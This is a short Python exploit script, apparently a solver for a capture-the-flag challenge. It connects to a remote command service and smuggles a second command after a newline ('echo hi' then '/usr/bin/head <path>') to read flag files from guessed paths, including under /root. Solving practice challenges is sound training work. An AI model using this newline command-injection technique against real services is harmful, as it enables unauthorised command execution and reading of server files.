import socket


def recv_until(s, terminator):
    data = b''
    while terminator.encode() not in data:
        chunk = s.recv(1024)
        if not chunk:
            break
        data += chunk
    return data


def main():
    host = 'chal.competitivecyber.club'
    port = 3333

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = recv_until(s, 'Please input command: ')
    print(data.decode())

    possible_paths = [
        '/flag.txt',
        'flag.txt',
        '/home/ctf/flag.txt',
        '/home/ctf/flag',
        '/home/flag.txt',
        '/home/flag',
        '/root/flag.txt',
        '/root/flag',
    ]

    for path in possible_paths:
        command = f'echo hi\n/usr/bin/head {path}\n'
        print(f"Trying to read flag from: {path}")
        s.send(command.encode())

        data = recv_until(s, 'Please input command: ')
        response = data.decode()
        print(response)
        if 'PCTF{' in response or 'pctf{' in response:
            print("Flag found!")
            break

    s.close()


if __name__ == '__main__':
    main()
